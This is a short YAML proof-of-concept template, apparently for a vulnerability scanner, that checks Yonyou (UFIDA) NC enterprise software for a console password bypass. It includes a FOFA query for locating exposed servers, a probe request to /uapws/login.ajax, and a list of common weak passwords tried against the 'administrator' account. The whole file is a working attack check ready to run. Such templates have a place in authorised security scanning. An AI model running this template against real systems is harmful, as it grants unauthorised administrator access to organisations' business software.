id: poc-yaml-yongyou-nc-console-password-bypass
info:
  name: 用友NC 控制台密码绕过漏洞
  severity: high
  tags:
  - 弱口令
  finger: 用友NC
  fofa: app="用友-UFIDA-NC"
variables:
  r_passwd: '123456

    111111

    admin

    1

    123

    password

    admin123'
firstRequest:
  method: POST
  path: /uapws/login.ajax
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: name=xxxx&password=xxxx
  expression: status_code == 200 && body == "0"
requests:
- method: POST
  path: /uapws/login.ajax
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: name=administrator&password={{.r_passwd}}
  expression: status_code == 200 && body == "1"
transport: http
